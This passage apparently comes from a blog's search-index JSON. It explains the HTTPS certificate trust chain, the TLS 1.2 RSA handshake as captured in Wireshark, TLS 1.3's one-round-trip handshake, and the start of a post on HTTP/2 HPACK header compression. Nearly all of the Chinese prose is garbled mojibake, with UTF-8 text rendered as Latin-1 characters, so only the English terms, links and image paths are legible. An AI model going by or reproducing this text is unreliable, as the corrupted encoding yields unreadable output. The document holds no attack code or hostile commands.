è¯ä¹¦ã€‚\n\nåœ¨è¿™äº›æ­¥éª¤ä¸­ï¼Œæœ€å¼€å§‹å®¢æˆ·ç«¯åªä¿¡ä»»æ ¹è¯ä¹¦ GlobalSign Root CA è¯ä¹¦çš„ï¼Œç„¶å â€œGlobalSign Root CAâ€ è¯ä¹¦ä¿¡ä»» â€œGlobalSign Organization Validation CA - SHA256 - G2â€ è¯ä¹¦ï¼Œè€Œ â€œGlobalSign Organization Validation CA - SHA256 - G2â€ è¯ä¹¦åˆä¿¡ä»» [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) è¯ä¹¦ï¼Œäºæ˜¯å®¢æˆ·ç«¯ä¹Ÿä¿¡ä»» [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/)è¯ä¹¦ã€‚\n\næ€»æ‹¬æ¥è¯´ï¼Œç”±äºç”¨æˆ·ä¿¡ä»» GlobalSignï¼Œæ‰€ä»¥ç”± GlobalSign æ‰€æ‹…ä¿çš„ [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) å¯ä»¥è¢«ä¿¡ä»»ï¼Œå¦å¤–ç”±äºç”¨æˆ·ä¿¡ä»»æ“ä½œç³»ç»Ÿæˆ–æµè§ˆå™¨çš„è½¯ä»¶å•†ï¼Œæ‰€ä»¥ç”±è½¯ä»¶å•†é¢„è½½äº†æ ¹è¯ä¹¦çš„ GlobalSign éƒ½å¯è¢«ä¿¡ä»»ã€‚\n\n<img src=\"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/c.jpg\" alt=\"1\" style=\"zoom:50%;\" />\n\næ“ä½œç³»ç»Ÿé‡Œä¸€èˆ¬éƒ½ä¼šå†…ç½®ä¸€äº›æ ¹è¯ä¹¦ï¼Œæ¯”å¦‚æˆ‘çš„ MAC ç”µè„‘é‡Œå†…ç½®çš„æ ¹è¯ä¹¦æœ‰è¿™ä¹ˆå¤šï¼š\n\n<img src=\"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/d.jpg\" alt=\"1\" style=\"zoom:67%;\" />\n\nè¿™æ ·çš„ä¸€å±‚å±‚åœ°éªŒè¯å°±æ„æˆäº†ä¸€æ¡ä¿¡ä»»é“¾è·¯ï¼Œæ•´ä¸ªè¯ä¹¦ä¿¡ä»»é“¾éªŒè¯æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n<img src=\"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/e.jpg\" alt=\"1\" style=\"zoom:67%;\" />\n\næœ€åä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆéœ€è¦è¯ä¹¦é“¾è¿™ä¹ˆéº»çƒ¦çš„æµç¨‹ï¼ŸRoot CA ä¸ºä»€ä¹ˆä¸ç›´æ¥é¢å‘è¯ä¹¦ï¼Œè€Œæ˜¯è¦æé‚£ä¹ˆå¤šä¸­é—´å±‚çº§å‘¢ï¼Ÿ\n\nè¿™æ˜¯ä¸ºäº†ç¡®ä¿æ ¹è¯ä¹¦çš„ç»å¯¹å®‰å…¨æ€§ï¼Œå°†æ ¹è¯ä¹¦éš”ç¦»åœ°è¶Šä¸¥æ ¼è¶Šå¥½ï¼Œä¸ç„¶æ ¹è¯ä¹¦å¦‚æœå¤±å®ˆäº†ï¼Œé‚£ä¹ˆæ•´ä¸ªä¿¡ä»»é“¾éƒ½ä¼šæœ‰é—®é¢˜ã€‚\n\n\n\n# 3. tls è®¤è¯è¿‡ç¨‹ï¼ˆå››æ¬¡æ¡æ‰‹ï¼‰\n\nç”¨ Wireshark å·¥å…·æŠ“äº†ç”¨ RSA å¯†é’¥äº¤æ¢çš„ TLS æ¡æ‰‹è¿‡ç¨‹ï¼Œä½ å¯ä»¥ä»ä¸‹é¢çœ‹åˆ°ï¼Œä¸€å…±ç»å†æ¥å››æ¬¡æ¡æ‰‹\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/0.jpg)\n\n<img src=\"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/v2-d3ab3e41c76aa233f5cd4898bc9e819e_b.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\n### 3.1 å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ **Client Hello** æ¶ˆæ¯\n\nå®¢æˆ·ç«¯é¦–å…ˆä¼šå‘ä¸€ä¸ªã€ŒClient Helloã€æ¶ˆæ¯ï¼Œå­—é¢æ„æ€æˆ‘ä»¬ä¹Ÿèƒ½ç†è§£åˆ°ï¼Œè¿™æ˜¯è·ŸæœåŠ¡å™¨ã€Œæ‰“æ‹›å‘¼ã€ã€‚\n\næ¶ˆæ¯é‡Œé¢æœ‰å®¢æˆ·ç«¯ä½¿ç”¨çš„ TLS ç‰ˆæœ¬å·ã€æ”¯æŒçš„å¯†ç å¥—ä»¶åˆ—è¡¨ï¼Œä»¥åŠç”Ÿæˆçš„éšæœºæ•°ï¼ˆClient Randomï¼‰ï¼Œè¿™ä¸ªéšæœºæ•°ä¼šè¢«æœåŠ¡ç«¯ä¿ç•™ï¼Œå®ƒæ˜¯ç”Ÿæˆå¯¹ç§°åŠ å¯†å¯†é’¥çš„ææ–™ä¹‹ä¸€ã€‚\n\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/1.jpg)\n\n\n\n### 3.2 æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€ **Server Hello** æ¶ˆæ¯\n\nå½“æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ã€ŒClient Helloã€æ¶ˆæ¯åï¼Œä¼šç¡®è®¤ TLS ç‰ˆæœ¬å·æ˜¯å¦æ”¯æŒï¼Œå’Œä»å¯†ç å¥—ä»¶åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªå¯†ç å¥—ä»¶ï¼Œä»¥åŠç”Ÿæˆéšæœºæ•°ï¼ˆServer Randomï¼‰ã€‚\n\næ¥ç€ï¼Œè¿”å›ã€ŒServer Helloã€æ¶ˆæ¯ï¼Œæ¶ˆæ¯é‡Œé¢æœ‰æœåŠ¡å™¨ç¡®è®¤çš„ TLS ç‰ˆæœ¬å·ï¼Œä¹Ÿç»™å‡ºäº†éšæœºæ•°ï¼ˆServer Randomï¼‰ï¼Œç„¶åä»å®¢æˆ·ç«¯çš„å¯†ç å¥—ä»¶åˆ—è¡¨é€‰æ‹©äº†ä¸€ä¸ªåˆé€‚çš„å¯†ç å¥—ä»¶ã€‚\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/2.jpg)\n\n\n\nå¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡ç«¯é€‰æ‹©çš„å¯†ç å¥—ä»¶æ˜¯ â€œCipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256â€ã€‚\n\nè¿™ä¸ªå¯†ç å¥—ä»¶çœ‹èµ·æ¥çœŸè®©äººå¤´æ™•ï¼Œå¥½ä¸€å¤§ä¸²ï¼Œä½†æ˜¯å…¶å®å®ƒæ˜¯æœ‰å›ºå®šæ ¼å¼å’Œè§„èŒƒçš„ã€‚åŸºæœ¬çš„å½¢å¼æ˜¯ã€Œå¯†é’¥äº¤æ¢ç®—æ³• + ç­¾åç®—æ³• + å¯¹ç§°åŠ å¯†ç®—æ³• + æ‘˜è¦ç®—æ³•ã€ï¼Œ ä¸€èˆ¬ WITH å•è¯å‰é¢æœ‰ä¸¤ä¸ªå•è¯ï¼Œç¬¬ä¸€ä¸ªå•è¯æ˜¯çº¦å®šå¯†é’¥äº¤æ¢çš„ç®—æ³•ï¼Œç¬¬äºŒä¸ªå•è¯æ˜¯çº¦å®šè¯ä¹¦çš„éªŒè¯ç®—æ³•ã€‚æ¯”å¦‚åˆšæ‰çš„å¯†ç å¥—ä»¶çš„æ„æ€å°±æ˜¯ï¼š\n\n- ç”±äº WITH å•è¯åªæœ‰ä¸€ä¸ª RSAï¼Œåˆ™è¯´æ˜æ¡æ‰‹æ—¶å¯†é’¥äº¤æ¢ç®—æ³•å’Œç­¾åç®—æ³•éƒ½æ˜¯ä½¿ç”¨ RSAï¼›\n\n- æ¡æ‰‹åçš„é€šä¿¡ä½¿ç”¨ AES å¯¹ç§°ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦ 128 ä½ï¼Œåˆ†ç»„æ¨¡å¼æ˜¯ GCMï¼›\n\n- æ‘˜è¦ç®—æ³• SHA256 ç”¨äºæ¶ˆæ¯è®¤è¯å’Œäº§ç”Ÿéšæœºæ•°ï¼›\n\n  \n\n å°±å‰é¢è¿™ä¸¤ä¸ªå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç›¸äº’ã€Œæ‰“æ‹›å‘¼ã€çš„è¿‡ç¨‹ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å°±å·²ç¡®è®¤äº† TLS ç‰ˆæœ¬å’Œä½¿ç”¨çš„å¯†ç å¥—ä»¶ï¼Œè€Œä¸”ä½ å¯èƒ½å‘ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½ä¼šå„è‡ªç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå¹¶ä¸”è¿˜ä¼šæŠŠéšæœºæ•°ä¼ é€’ç»™å¯¹æ–¹ã€‚é‚£è¿™ä¸ªéšæœºæ•°æœ‰å•¥ç”¨å‘¢ï¼Ÿå…¶å®è¿™ä¸¤ä¸ªéšæœºæ•°æ˜¯åç»­ä½œä¸ºç”Ÿæˆã€Œä¼šè¯å¯†é’¥ã€çš„æ¡ä»¶ï¼Œæ‰€è°“çš„ä¼šè¯å¯†é’¥å°±æ˜¯æ•°æ®ä¼ è¾“æ—¶ï¼Œæ‰€ä½¿ç”¨çš„å¯¹ç§°åŠ å¯†å¯†é’¥ã€‚\n\n\n\nç„¶åï¼ŒæœåŠ¡ç«¯ä¸ºäº†è¯æ˜è‡ªå·±çš„èº«ä»½ï¼Œä¼šå‘é€ã€Œ**Server Certificate**ã€ç»™å®¢æˆ·ç«¯ï¼Œè¿™ä¸ªæ¶ˆæ¯é‡Œå«æœ‰æ•°å­—è¯ä¹¦ã€‚\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/3.jpg)\n\n\n\néšåï¼ŒæœåŠ¡ç«¯å‘äº†ã€Œ**Server Hello Done**ã€æ¶ˆæ¯ï¼Œç›®çš„æ˜¯å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œæˆ‘å·²ç»æŠŠè¯¥ç»™ä½ çš„ä¸œè¥¿éƒ½ç»™ä½ äº†ï¼Œæœ¬æ¬¡æ‰“æ‹›å‘¼å®Œæ¯•ã€‚\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/4.jpg)\n\n\n\n<img src=\"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/v2-d3ab3e41c76aa233f5cd4898bc9e819e_b.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\n### 3.3 å®¢æˆ·ç«¯éªŒè¯ æœåŠ¡å™¨è¯ä¹¦ å’Œ åå•†å¯†é’¥\n\nå®¢æˆ·ç«¯å»éªŒè¯å®Œè¯ä¹¦åï¼Œè®¤ä¸ºå¯ä¿¡åˆ™ç»§ç»­å¾€ä¸‹èµ°ã€‚æ¥ç€ï¼Œå®¢æˆ·ç«¯å°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„éšæœºæ•° (pre-master)ï¼Œç”¨æœåŠ¡å™¨çš„ RSA å…¬é’¥åŠ å¯†è¯¥éšæœºæ•°ï¼Œé€šè¿‡ã€ŒChange Cipher Key Exchangeã€æ¶ˆæ¯ä¼ ç»™æœåŠ¡ç«¯ã€‚\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/5.jpg)\n\n\n\næœåŠ¡ç«¯æ”¶åˆ°åï¼Œç”¨ RSA ç§é’¥è§£å¯†ï¼Œå¾—åˆ°å®¢æˆ·ç«¯å‘æ¥çš„éšæœºæ•° (pre-master)ã€‚\n\nè‡³æ­¤ï¼Œ**å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åŒæ–¹éƒ½å…±äº«äº†ä¸‰ä¸ªéšæœºæ•°ï¼Œåˆ†åˆ«æ˜¯ Client Randomã€Server Randomã€pre-master**ã€‚\n\n\n\näºæ˜¯ï¼ŒåŒæ–¹æ ¹æ®å·²ç»å¾—åˆ°çš„ä¸‰ä¸ªéšæœºæ•°ï¼Œç”Ÿæˆ**ä¼šè¯å¯†é’¥ï¼ˆMaster Secretï¼‰**ï¼Œå®ƒæ˜¯å¯¹ç§°å¯†é’¥ï¼Œç”¨äºå¯¹åç»­çš„ HTTP è¯·æ±‚/å“åº”çš„æ•°æ®åŠ è§£å¯†ã€‚\n\nç”Ÿæˆå®Œä¼šè¯å¯†é’¥åï¼Œç„¶åå®¢æˆ·ç«¯å‘ä¸€ä¸ªã€Œ**Change Cipher Spec**ã€ï¼Œå‘Šè¯‰æœåŠ¡ç«¯å¼€å§‹ä½¿ç”¨åŠ å¯†æ–¹å¼å‘é€æ¶ˆæ¯ã€‚\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/6.jpg)\n\nç„¶åï¼Œå®¢æˆ·ç«¯å†å‘ä¸€ä¸ªã€Œ**Encrypted Handshake Messageï¼ˆFinishdï¼‰**ã€æ¶ˆæ¯ï¼ŒæŠŠä¹‹å‰æ‰€æœ‰å‘é€çš„æ•°æ®åšä¸ªæ‘˜è¦ï¼Œå†ç”¨ä¼šè¯å¯†é’¥ï¼ˆmaster secretï¼‰åŠ å¯†ä¸€ä¸‹ï¼Œè®©æœåŠ¡å™¨åšä¸ªéªŒè¯ï¼ŒéªŒè¯åŠ å¯†é€šä¿¡æ˜¯å¦å¯ç”¨å’Œä¹‹å‰æ¡æ‰‹ä¿¡æ¯æ˜¯å¦æœ‰è¢«ä¸­é€”ç¯¡æ”¹è¿‡ã€‚\n\n\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/7.jpg)\n\nå¯ä»¥å‘ç°ï¼Œã€ŒChange Cipher Specã€ä¹‹å‰ä¼ è¾“çš„ TLS æ¡æ‰‹æ•°æ®éƒ½æ˜¯æ˜æ–‡ï¼Œä¹‹åéƒ½æ˜¯å¯¹ç§°å¯†é’¥åŠ å¯†çš„å¯†æ–‡ã€‚\n\n\n\n### 3.4 æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€ Finished æ¶ˆæ¯\n\næœåŠ¡å™¨ä¹Ÿæ˜¯åŒæ ·çš„æ“ä½œï¼Œå‘ã€Œ**Change Cipher Spec**ã€å’Œã€Œ**Encrypted Handshake Message**ã€æ¶ˆæ¯ï¼Œå¦‚æœåŒæ–¹éƒ½éªŒè¯åŠ å¯†å’Œè§£å¯†æ²¡é—®é¢˜ï¼Œé‚£ä¹ˆæ¡æ‰‹æ­£å¼å®Œæˆã€‚\n\næœ€åï¼Œå°±ç”¨ã€Œä¼šè¯å¯†é’¥ã€åŠ è§£å¯† HTTP è¯·æ±‚å’Œå“åº”äº†ã€‚\n\n\n\n# 4. TLS å‡çº§\n\nå¦‚æœå¯ä»¥æŠŠ TLS 1.2 å‡çº§æˆ TLS 1.3ï¼ŒTLS 1.3 å¤§å¹…åº¦ç®€åŒ–äº†æ¡æ‰‹çš„æ­¥éª¤ï¼Œå®Œæˆ TLS æ¡æ‰‹åªè¦ 1 RTTï¼Œè€Œä¸”å®‰å…¨æ€§æ›´é«˜ã€‚\n\nåœ¨ TLS 1.2 çš„æ¡æ‰‹ä¸­ï¼Œä¸€èˆ¬æ˜¯éœ€è¦ 4 æ¬¡æ¡æ‰‹ï¼Œå…ˆè¦é€šè¿‡ Client Hello ï¼ˆç¬¬ 1 æ¬¡æ¡æ‰‹ï¼‰å’Œ Server Helloï¼ˆç¬¬ 2 æ¬¡æ¡æ‰‹ï¼‰ æ¶ˆæ¯åå•†å‡ºåç»­ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼Œå†äº’ç›¸äº¤æ¢å…¬é’¥ï¼ˆç¬¬ 3 å’Œ ç¬¬ 4 æ¬¡æ¡æ‰‹ï¼‰ï¼Œç„¶åè®¡ç®—å‡ºæœ€ç»ˆçš„ä¼šè¯å¯†é’¥ï¼Œä¸‹å›¾çš„å·¦è¾¹éƒ¨åˆ†å°±æ˜¯ TLS 1.2 çš„æ¡æ‰‹è¿‡ç¨‹ï¼š\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/13.jpg)\n\nä¸Šå›¾çš„å³è¾¹éƒ¨åˆ†å°±æ˜¯ TLS 1.3 çš„æ¡æ‰‹è¿‡ç¨‹ï¼Œå¯ä»¥å‘ç° TLS 1.3 æŠŠ Hello å’Œå…¬é’¥äº¤æ¢è¿™ä¸¤ä¸ªæ¶ˆæ¯åˆå¹¶æˆäº†ä¸€ä¸ªæ¶ˆæ¯ï¼Œäºæ˜¯è¿™æ ·å°±å‡å°‘åˆ°åªéœ€ 1 RTT å°±èƒ½å®Œæˆ TLS æ¡æ‰‹ã€‚\n\næ€ä¹ˆåˆå¹¶çš„å‘¢ï¼Ÿå…·ä½“çš„åšæ³•æ˜¯ï¼Œå®¢æˆ·ç«¯åœ¨ Client Hello æ¶ˆæ¯é‡Œå¸¦ä¸Šäº†æ”¯æŒçš„æ¤­åœ†æ›²çº¿ï¼Œä»¥åŠè¿™äº›æ¤­åœ†æ›²çº¿å¯¹åº”çš„å…¬é’¥ã€‚\n\næœåŠ¡ç«¯æ”¶åˆ°åï¼Œé€‰å®šä¸€ä¸ªæ¤­åœ†æ›²çº¿ç­‰å‚æ•°ï¼Œç„¶åè¿”å›æ¶ˆæ¯æ—¶ï¼Œå¸¦ä¸ŠæœåŠ¡ç«¯è¿™è¾¹çš„å…¬é’¥ã€‚ç»è¿‡è¿™ 1 ä¸ª RTTï¼ŒåŒæ–¹æ‰‹ä¸Šå·²ç»æœ‰ç”Ÿæˆä¼šè¯å¯†é’¥çš„ææ–™äº†ï¼Œäºæ˜¯å®¢æˆ·ç«¯è®¡ç®—å‡ºä¼šè¯å¯†é’¥ï¼Œå°±å¯ä»¥è¿›è¡Œåº”ç”¨æ•°æ®çš„åŠ å¯†ä¼ è¾“äº†ã€‚\n\nè€Œä¸”ï¼ŒTLS1.3 å¯¹å¯†ç å¥—ä»¶è¿›è¡Œâ€œå‡è‚¥â€äº†ï¼Œ å¯¹äºå¯†é’¥äº¤æ¢ç®—æ³•ï¼ŒåºŸé™¤äº†ä¸æ”¯æŒå‰å‘å®‰å…¨æ€§çš„ RSA å’Œ DH ç®—æ³•ï¼Œåªæ”¯æŒ ECDHE ç®—æ³•ã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html\n+ https://draveness.me/whys-the-design-https-latency/\n+ https://zhuanlan.zhihu.com/p/344086342\n+ https://zhuanlan.zhihu.com/p/348215533\n+ https://zhuanlan.zhihu.com/p/346489295","tags":["http"],"categories":["https"]},{"title":"http2çš„å˜åŒ–å’Œ","url":"%2Fp%2Fd55bd12d.html","content":"\n# 1. http2ä»‹ç»\n\nHTTP/2 å‡ºæ¥çš„ç›®çš„æ˜¯ä¸ºäº†æ”¹å–„ HTTP çš„æ€§èƒ½ã€‚åè®®å‡çº§æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åœ°æ–¹ï¼Œå°±æ˜¯è¦å…¼å®¹è€ç‰ˆæœ¬çš„åè®®ï¼Œå¦åˆ™æ–°åè®®æ¨å¹¿èµ·æ¥å°±ç›¸å½“å›°éš¾ï¼Œæ‰€å¹¸ HTTP/2 åšåˆ°äº†å…¼å®¹ HTTP/1.1 ã€‚é‚£ä¹ˆï¼ŒHTTP/2 æ˜¯æ€ä¹ˆåšçš„å‘¢ï¼Ÿ\n\nç¬¬ä¸€ç‚¹ï¼ŒHTTP/2 æ²¡æœ‰åœ¨ URI é‡Œå¼•å…¥æ–°çš„åè®®åï¼Œä»ç„¶ç”¨ã€Œhttp://ã€è¡¨ç¤ºæ˜æ–‡åè®®ï¼Œç”¨ã€Œhttps://ã€è¡¨ç¤ºåŠ å¯†åè®®ï¼Œäºæ˜¯åªéœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åœ¨èƒŒåè‡ªåŠ¨å‡çº§åè®®ï¼Œè¿™æ ·å¯ä»¥è®©ç”¨æˆ·æ„è¯†ä¸åˆ°åè®®çš„å‡çº§ï¼Œå¾ˆå¥½çš„å®ç°äº†åè®®çš„å¹³æ»‘å‡çº§ã€‚\n\nç¬¬äºŒç‚¹ï¼Œåªåœ¨åº”ç”¨å±‚åšäº†æ”¹å˜ï¼Œè¿˜æ˜¯åŸºäº TCP åè®®ä¼ è¾“ï¼Œåº”ç”¨å±‚æ–¹é¢ä¸ºäº†ä¿æŒåŠŸèƒ½ä¸Šçš„å…¼å®¹ï¼ŒHTTP/2 æŠŠ HTTP åˆ†è§£æˆäº†ã€Œè¯­ä¹‰ã€å’Œã€Œè¯­æ³•ã€ä¸¤ä¸ªéƒ¨åˆ†ï¼Œã€Œè¯­ä¹‰ã€å±‚ä¸åšæ”¹åŠ¨ï¼Œä¸ HTTP/1.1 å®Œå…¨ä¸€è‡´ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹æ³•ã€çŠ¶æ€ç ã€å¤´å­—æ®µç­‰è§„åˆ™ä¿ç•™ä¸å˜ã€‚\n\nä½†æ˜¯ï¼ŒHTTP/2 åœ¨ã€Œè¯­æ³•ã€å±‚é¢åšäº†å¾ˆå¤šæ”¹é€ ï¼ŒåŸºæœ¬æ”¹å˜äº† HTTP æŠ¥æ–‡çš„ä¼ è¾“æ ¼å¼ã€‚\n\n<!-- more -->\n\n# 2. http2åŠŸèƒ½\n\n### 2.1 Headerå‹ç¼©\n\nHTTP åè®®çš„æŠ¥æ–‡æ˜¯ç”±ã€ŒHeader + Bodyã€æ„æˆçš„ï¼Œå¯¹äº Body éƒ¨åˆ†ï¼ŒHTTP/1.1 åè®®å¯ä»¥ä½¿ç”¨å¤´å­—æ®µ ã€ŒContent-Encodingã€æŒ‡å®š Body çš„å‹ç¼©æ–¹å¼ï¼Œæ¯”å¦‚ç”¨ gzip å‹ç¼©ï¼Œè¿™æ ·å¯ä»¥èŠ‚çº¦å¸¦å®½ï¼Œä½†æŠ¥æ–‡ä¸­çš„å¦å¤–ä¸€éƒ¨åˆ† Headerï¼Œæ˜¯æ²¡æœ‰é’ˆå¯¹å®ƒçš„ä¼˜åŒ–æ‰‹æ®µã€‚\n\nHTTP/1.1 æŠ¥æ–‡ä¸­ Header éƒ¨åˆ†å­˜åœ¨çš„é—®é¢˜ï¼š\n\n- å«å¾ˆå¤šå›ºå®šçš„å­—æ®µï¼Œæ¯”å¦‚Cookieã€User Agentã€Accept ç­‰ï¼Œè¿™äº›å­—æ®µåŠ èµ·æ¥ä¹Ÿé«˜è¾¾å‡ ç™¾å­—èŠ‚ç”šè‡³ä¸Šåƒå­—èŠ‚ï¼Œæ‰€ä»¥æœ‰å¿…è¦å‹ç¼©ï¼›\n- å¤§é‡çš„è¯·æ±‚å’Œå“åº”çš„æŠ¥æ–‡é‡Œæœ‰å¾ˆå¤šå­—æ®µå€¼éƒ½æ˜¯é‡å¤çš„ï¼Œè¿™æ ·ä¼šä½¿å¾—å¤§é‡å¸¦å®½è¢«è¿™äº›å†—ä½™çš„æ•°æ®å ç”¨äº†ï¼Œæ‰€ä»¥æœ‰å¿…é¡»è¦é¿å…é‡å¤æ€§ï¼›\n- å­—æ®µæ˜¯ ASCII ç¼–ç çš„ï¼Œè™½ç„¶æ˜“äºäººç±»è§‚å¯Ÿï¼Œä½†æ•ˆç‡ä½ï¼Œæ‰€ä»¥æœ‰å¿…è¦æ”¹æˆäºŒè¿›åˆ¶ç¼–ç ï¼›\n\nHTTP/2 å¯¹ Header éƒ¨åˆ†åšäº†å¤§æ”¹é€ ï¼ŒæŠŠä»¥ä¸Šçš„é—®é¢˜éƒ½è§£å†³äº†ã€‚\n\n\n\nHTTP/2 æ²¡ä½¿ç”¨å¸¸è§çš„ gzip å‹ç¼©æ–¹å¼æ¥å‹ç¼©å¤´éƒ¨ï¼Œè€Œæ˜¯å¼€å‘äº† HPACK ç®—æ³•ï¼ŒHPACK ç®—æ³•ä¸»è¦åŒ…å«ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š\n\n- é™æ€å­—å…¸ï¼›\n- åŠ¨æ€å­—å…¸ï¼›\n- Huffman ç¼–ç ï¼ˆå‹ç¼©ç®—æ³•ï¼‰ï¼›\n\nå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸¤ç«¯éƒ½ä¼šå»ºç«‹å’Œç»´æŠ¤ã€Œå­—å…¸ã€ï¼Œç”¨é•¿åº¦è¾ƒå°çš„ç´¢å¼•å·è¡¨ç¤ºé‡å¤çš„å­—ç¬¦ä¸²ï¼Œå†ç”¨ Huffman ç¼–ç å‹ç¼©æ•°æ®ï¼Œå¯è¾¾åˆ° 50%~90% çš„é«˜å‹ç¼©ç‡ã€‚\n\n\n\né™æ€è¡¨åŒ…å«äº† 61 ç§é«˜é¢‘å‡ºç°åœ¨å¤´éƒ¨çš„å­—ç¬¦ä¸²ï¼Œä¸åœ¨é™æ€è¡¨èŒƒå›´å†…çš„å¤´éƒ¨å­—ç¬¦ä¸²å°±è¦è‡ªè¡Œæ„å»ºåŠ¨æ€è¡¨ï¼Œå®ƒçš„ Index ä» `62` èµ·æ­¥ï¼Œä¼šåœ¨ç¼–ç è§£ç çš„æ—¶å€™éšæ—¶æ›´æ–°ã€‚\n\næ¯”å¦‚ï¼Œç¬¬ä¸€æ¬¡å‘é€æ—¶å¤´éƒ¨ä¸­çš„ã€Œ`user-agent` ã€å­—æ®µæ•°æ®æœ‰ä¸Šç™¾ä¸ªå­—èŠ‚ï¼Œç»è¿‡ Huffman ç¼–ç å‘é€å‡ºå»åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ–¹éƒ½ä¼šæ›´æ–°è‡ªå·±çš„åŠ¨æ€è¡¨ï¼Œæ·»åŠ ä¸€ä¸ªæ–°çš„ Index å· 62ã€‚**é‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡å‘é€çš„æ—¶å€™ï¼Œå°±ä¸ç”¨é‡å¤å‘è¿™ä¸ªå­—æ®µçš„æ•°æ®äº†ï¼Œåªç”¨å‘ 1 ä¸ªå­—èŠ‚çš„ Index å·å°±å¥½äº†ï¼Œå› ä¸ºåŒæ–¹éƒ½å¯ä»¥æ ¹æ®è‡ªå·±çš„åŠ¨æ€è¡¨è·å–åˆ°å­—æ®µçš„æ•°æ®**ã€‚\n\næ‰€ä»¥ï¼Œä½¿å¾—åŠ¨æ€è¡¨ç”Ÿæ•ˆæœ‰ä¸€ä¸ªå‰æï¼š**å¿…é¡»åŒä¸€ä¸ªè¿æ¥ä¸Šï¼Œé‡å¤ä¼ è¾“å®Œå…¨ç›¸åŒçš„ HTTP å¤´éƒ¨**ã€‚å¦‚æœæ¶ˆæ¯å­—æ®µåœ¨ 1 ä¸ªè¿æ¥ä¸Šåªå‘é€äº† 1 æ¬¡ï¼Œæˆ–è€…é‡å¤ä¼ è¾“æ—¶ï¼Œå­—æ®µæ€»æ˜¯ç•¥æœ‰å˜åŒ–ï¼ŒåŠ¨æ€è¡¨å°±æ— æ³•è¢«å……åˆ†åˆ©ç”¨äº†ã€‚\n\n\n\nç†æƒ³å¾ˆç¾å¥½ï¼Œç°å®å¾ˆéª¨æ„Ÿã€‚åŠ¨æ€è¡¨è¶Šå¤§ï¼Œå ç”¨çš„å†…å­˜ä¹Ÿå°±è¶Šå¤§ï¼Œå¦‚æœå ç”¨äº†å¤ªå¤šå†…å­˜ï¼Œæ˜¯ä¼šå½±å“æœåŠ¡å™¨æ€§èƒ½çš„ï¼Œå› æ­¤ Web æœåŠ¡å™¨éƒ½ä¼šæä¾›ç±»ä¼¼ `http2_max_requests` çš„é…ç½®ï¼Œç”¨äºé™åˆ¶ä¸€ä¸ªè¿æ¥ä¸Šèƒ½å¤Ÿä¼ è¾“çš„è¯·æ±‚æ•°é‡ï¼Œé¿å…åŠ¨æ€è¡¨æ— é™å¢å¤§ï¼Œè¯·æ±‚æ•°é‡åˆ°è¾¾ä¸Šé™åï¼Œå°±ä¼šå…³é—­ HTTP/2 è¿æ¥æ¥é‡Šæ”¾å†…å­˜ã€‚\n\n\n\nHTTP/2 å¤´éƒ¨çš„ç¼–ç é€šè¿‡ã€Œé™æ€è¡¨ã€åŠ¨æ€è¡¨ã€Huffman ç¼–ç ã€å…±åŒå®Œæˆçš„ã€‚\n\n### 2.2 äºŒè¿›åˆ¶ä¼ è¾“æ•°æ®\n\nHTTP/2 å‰å®³çš„åœ°æ–¹åœ¨äºå°† HTTP/1 çš„æ–‡æœ¬æ ¼å¼æ”¹æˆäºŒè¿›åˆ¶æ ¼å¼ä¼ è¾“æ•°æ®ï¼Œæå¤§æé«˜äº† HTTP ä¼ è¾“æ•ˆç‡ï¼Œè€Œä¸”äºŒè¿›åˆ¶æ•°æ®ä½¿ç”¨ä½è¿ç®—èƒ½é«˜æ•ˆè§£æã€‚\n\nHTTP/2 